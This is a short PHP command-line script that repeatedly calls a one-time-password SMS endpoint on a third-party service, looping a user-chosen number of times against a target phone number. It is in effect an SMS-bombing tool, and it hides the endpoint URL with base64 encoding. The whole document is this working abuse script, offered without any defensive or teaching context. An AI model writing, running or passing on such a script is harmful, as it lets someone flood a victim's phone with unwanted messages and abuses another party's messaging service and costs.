<?php
function sendGetRequest($phoneNumber) {
    $decodedUrl = base64_decode("aHR0cHM6Ly9sb3R0ZXJ5LWFwaXMtenFta2tscDViYS1lbS5hLnJ1bi5hcHAvc2VuZE9UUC8/cGhvbmU9");
    $fullUrl = $decodedUrl . $phoneNumber;
    $response = file_get_contents($fullUrl);
    echo $response . "\n"; // Adding a newline for better readability
}

if ($argc != 3) {
    echo "Usage: php sender.php <phone_number> <iteration_count>\n";
    exit(1);
}

$phoneNumber = $argv[1];
$iterationCount = (int)$argv[2];

// Iterate and send requests
for ($i = 1; $i <= $iterationCount; $i++) {
    echo "Sending SMS $i:\n";
    sendGetRequest($phoneNumber);
}
?>
